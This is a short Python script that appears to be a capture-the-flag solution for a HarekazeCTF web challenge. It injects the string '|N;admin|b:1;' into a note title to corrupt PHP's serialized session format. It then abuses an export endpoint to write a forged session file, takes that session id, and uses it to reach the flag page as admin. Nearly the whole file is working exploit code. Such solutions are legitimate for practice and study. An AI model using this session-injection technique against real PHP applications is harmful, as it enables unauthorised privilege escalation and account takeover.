import re
import requests
URL = 'http://localhost/'

while True:
  # login as sess_
  sess = requests.Session()
  sess.post(URL + 'login.php', data={
    'user': 'sess_'
  })

  # make a crafted note
  sess.post(URL + 'add.php', data={
    'title': '|N;admin|b:1;',
    'body': 'aaa'
  })

  # make a fake session
  r = sess.get(URL + 'export.php?type=.').headers['Content-Disposition']
  sessid = re.findall(r'sess_([0-9a-z-]+)', r)[0]

  # get the flag
  r = requests.get(URL + '?page=flag', cookies={
    'PHPSESSID': sessid
  }).content.decode('utf-8')
  flag = re.findall(r'HarekazeCTF\{.+\}', r)

  if len(flag) > 0:
    print(flag[0])
    break